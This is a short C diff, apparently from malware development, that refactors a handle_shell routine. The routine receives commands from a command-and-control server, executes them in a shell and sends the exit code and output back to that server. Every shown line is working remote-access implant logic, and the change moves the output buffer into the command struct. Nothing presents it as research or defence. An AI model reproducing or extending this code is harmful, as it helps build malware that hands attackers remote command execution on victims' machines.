@@ -36,7 +36,6 @@ void handle_shell()
     int ret;
     unsigned int bytes_read;
     struct shell_cmd cmd;
-    char out[8192];
 
     log_info("Received SHELL command.");
     ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
@@ -64,11 +63,11 @@ void handle_shell()
     send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
     while (TRUE)
     {
-        bytes_read = read_shell_output(out, sizeof(out));
+        bytes_read = read_shell_output(cmd.out, sizeof(cmd.out));
         send_to_cnc(&bytes_read, sizeof(bytes_read));
         if (!bytes_read)
             return;
-        send_to_cnc(out, bytes_read);
+        send_to_cnc(cmd.out, bytes_read);
     }
 }
 
